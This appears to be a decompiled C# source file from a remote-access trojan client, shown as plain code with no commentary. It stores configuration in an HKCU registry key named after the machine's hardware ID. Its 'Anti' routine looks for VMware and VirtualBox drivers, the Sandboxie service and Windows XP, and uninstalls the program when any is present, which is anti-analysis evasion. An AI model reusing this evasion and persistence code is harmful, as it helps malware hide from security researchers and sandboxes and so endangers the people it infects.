using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Client_0._5;

[StandardModule]
internal sealed class C_Fuctions
{
	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static object DLV(string n)
	{
		object result = default(object);
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\" + C_ID.HWID()).DeleteValue(n);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GTV(string n)
	{
		try
		{
			return Conversions.ToString(Registry.CurrentUser.CreateSubKey("Software\\" + C_ID.HWID()).GetValue(n, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object STV(string n, string t)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\" + C_ID.HWID()).SetValue(n, t);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Array SplitWord(byte[] b, string Word)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), Word, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + Word.Length, b.Length - (array[0].Length + Word.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public static void Anti()
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\vmGuestLib.dll"))
			{
				C_Installation.DEL();
			}
			else if (C_ID.MyOS().ToString()!.ToLower().Contains("XP".ToLower()))
			{
				C_Installation.DEL();
			}
			else if (Process.GetProcessesByName("SbieSvc").Length >= 1)
			{
				C_Installation.DEL();
			}
			else if (File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxmrxnp.dll"))
			{
				C_Installation.DEL();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
